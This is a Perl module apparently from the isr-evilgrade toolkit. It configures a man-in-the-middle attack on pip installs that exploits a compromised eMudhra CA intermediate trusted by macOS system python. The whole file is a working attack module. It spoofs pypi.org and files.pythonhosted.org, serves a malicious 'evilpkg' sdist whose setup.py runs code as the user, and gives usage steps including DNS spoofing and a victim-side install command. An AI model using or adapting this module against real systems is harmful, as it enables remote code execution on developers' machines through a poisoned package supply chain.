###############
# pypi_update.pm
#
# pip install MITM via the compromised eMudhra CA.
#
# `pip install <pkg>` fetches the PEP503 simple index and a package from
# pypi.org / files.pythonhosted.org, then builds it -- running the sdist's
# setup.py at install time. A python whose TLS validates against
# /etc/ssl/cert.pem (e.g. macOS /usr/bin/python3) trusts the revoked,
# Apple-blocked eMudhra intermediate "EM DV TLS CA - G3C", so an on-path
# attacker serves a malicious sdist whose setup.py executes code as the user.
#
# NOTE: Homebrew's python uses its own cert bundle (without the AAA root) and
# is NOT affected; the system /usr/bin/python3 (LibreSSL / cert.pem) is.
#
# Use with: set sslcert certs/emudhra_mitm, DNS-spoof pypi.org and
# files.pythonhosted.org to this host, then on the victim:
#   /usr/bin/python3 -m pip install --index-url https://pypi.org/simple/ evilpkg
#
# This file is part of isr-evilgrade, www.faradaysec.com .
##
package modules::pypi_update;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'pip install MITM (eMudhra CA)',
    'version'     => '1.0',
    'appver'      => 'macOS /usr/bin/python3 (LibreSSL / cert.pem backend)',
    'cve'         => 'eMudhra intermediate key compromise (2026)',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Intercepts pip's PyPI traffic and serves a malicious sdist whose setup.py runs
at install time -> code execution as the user. Works against a python trusting
/etc/ssl/cert.pem (system python3), which still trusts the revoked eMudhra
intermediate. Set 'sslcert' to certs/emudhra_mitm.
},
    'vh' => '(pypi.org|files.pythonhosted.org|pypi.python.org)',
    'request' => [
        {   'req'    => '/simple/evilpkg/?$',
            'type'   => 'file',
            'method' => '', 'bin' => 0, 'string' => '', 'parse' => 0,
            'file'   => './include/pip_mitm/simple/evilpkg/index.html',
            'cheader' => "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n",
        },
        {   'req'    => '/.*evilpkg-1\.0\.tar\.gz',
            'type'   => 'file',
            'method' => '', 'bin' => 1, 'string' => '', 'parse' => 0,
            'file'   => './include/pip_mitm/simple/evilpkg/evilpkg-1.0.tar.gz',
            'cheader' => "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nConnection: close\r\n\r\n",
        },
    ],
    'options' => {
        'enable' => { 'val' => 0, 'desc' => 'Status' },
        'agent'  => { 'val' => './include/pip_mitm/simple/evilpkg/evilpkg-1.0.tar.gz', 'desc' => 'Required by webserver (the malicious sdist)' },
    }
};

sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
